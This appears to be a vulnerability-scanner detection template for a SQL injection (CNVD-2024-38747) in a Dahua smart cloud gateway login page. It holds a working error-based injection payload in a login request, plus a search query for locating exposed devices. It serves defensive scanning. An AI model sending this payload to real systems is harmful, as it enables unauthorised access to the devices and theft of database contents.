http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"md5({{num}})", "XPATH syntax error")
    - status_code == 404
    type: dsl
  raw:
  - 'POST /index.php/User/doLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    username=1'')and+updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)--+&password=

    '
id: CNVD-2024-38747
info:
  author: s4e-io
  description: 'Zhejiang Dahua Technology Co., Ltd. Smart Cloud Gateway Registration
    Management Platform has a SQL injection vulnerability, which can be exploited
    by attackers to obtain sensitive database information.

    '
  metadata:
    fofa-query: "title=\"\u667A\u80FD\u4E91\u7F51\u5173\u6CE8\u518C\u7BA1\u7406\u5E73\
      \u53F0\""
    max-request: 1
    verified: true
  name: Zhejiang Dahua Smart Cloud Gateway Registration Platform - SQL Injection
  reference:
  - https://blog.csdn.net/qq_39894062/article/details/142982815
  severity: high
  tags: cnvd,cnvd2024,sqli,dahua,vuln
variables:
  num: '999999999'
